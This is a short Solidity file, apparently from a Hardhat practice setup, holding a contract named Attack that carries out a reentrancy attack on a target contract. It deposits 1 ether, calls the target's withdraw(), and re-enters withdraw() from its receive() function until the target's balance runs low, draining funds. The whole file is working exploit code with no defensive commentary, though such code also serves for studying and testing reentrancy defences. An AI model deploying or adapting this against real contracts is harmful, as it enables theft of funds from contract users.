//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Attack {

    address private contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        console.log(msg.value, "Did recieve");
        console.log(balance(), "balance");
        if (contractAddress.balance >= msg.value) {
            callWithdrawBalance();
        }
     }

    function attack() public payable {
        require(msg.value >= 1 ether);
        (bool success, ) = contractAddress.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposit unsuccess");
        callWithdrawBalance();
    }
    
    function balance() public view returns(uint) {
        return address(this).balance;
    }

    function callWithdrawBalance() private {
        (bool success, ) = contractAddress.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "callWithdrawBalance unsuccess");
    }

    function toUint256(bytes memory _bytes) internal pure returns (uint256 value) {
        assembly {
            value := mload(add(_bytes, 0x20))
        }
    }
}